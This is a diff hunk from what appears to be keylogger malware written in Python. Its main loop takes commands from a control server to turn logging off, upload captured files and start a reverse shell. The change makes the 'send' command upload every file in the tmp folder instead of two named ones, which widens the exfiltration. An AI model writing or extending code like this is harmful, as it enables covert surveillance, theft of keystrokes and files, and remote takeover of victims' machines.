@@ -274,7 +274,8 @@ if __name__ == "__main__":
                     keylogger.deactivate()
                     keylogger.send_message_to_server("logging deactivated")
                 elif recv == "send":
-                    keylogger.send_files_to_server(["tmp/test1.png","tmp/test2.png"])
+                    files = [os.path.join("tmp", i) for i in os.listdir("tmp")]
+                    keylogger.send_files_to_server(files)
                 elif recv == "shell":
                     reverse_shell_active = True
                     keylogger.send_message_to_server("reverse shell activated")
